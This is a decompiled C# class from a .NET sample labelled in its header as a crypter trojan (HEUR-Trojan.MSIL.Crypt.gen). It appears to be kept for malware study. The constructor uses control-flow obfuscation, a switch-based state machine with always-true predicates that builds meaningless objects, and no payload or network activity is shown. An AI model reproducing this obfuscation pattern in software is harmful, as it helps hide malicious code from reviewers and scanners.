// Decompiled with JetBrains decompiler
// Type: DebuggerTypeProxyAttrib.Pages.Info
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Listeners;
using System.Runtime.CompilerServices;
using Tourield.Shared;

namespace DebuggerTypeProxyAttrib.Pages
{
  public class Info
  {
    public uint val;
    public TestRulesListener system;
    public TestRulesListener tokenizer;
    public TestRulesListener m_Model;
    public TestRulesListener _Merchant;
    public TestRulesListener attr;
    public Printer _Global;
    public Printer algo;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Info()
    {
      int num1 = 2;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 2:
            RegistryPagePage.ListMethod();
            num2 = 5;
            break;
          case 1:
          case 3:
            this._Merchant = new TestRulesListener();
            this.attr = new TestRulesListener();
            num2 = 4;
            break;
          case 4:
            this._Global = new Printer();
            this.algo = new Printer();
            // ISSUE: explicit constructor call
            base.\u002Ector();
            if (Info.ResetAttribute())
            {
              num1 = 7;
              continue;
            }
            goto case 6;
          case 5:
            this.system = new TestRulesListener();
            this.tokenizer = new TestRulesListener();
            if (Info.ResetAttribute())
            {
              num1 = 6;
              continue;
            }
            goto case 0;
          case 6:
            this.m_Model = new TestRulesListener();
            goto case 1;
          case 7:
            goto label_9;
          default:
            if (true)
            {
              num1 = 1;
              continue;
            }
            goto case 5;
        }
        num1 = num2;
      }
label_9:;
    }

    internal static bool ResetAttribute() => true;

    internal static bool CreateAttribute() => false;
  }
}
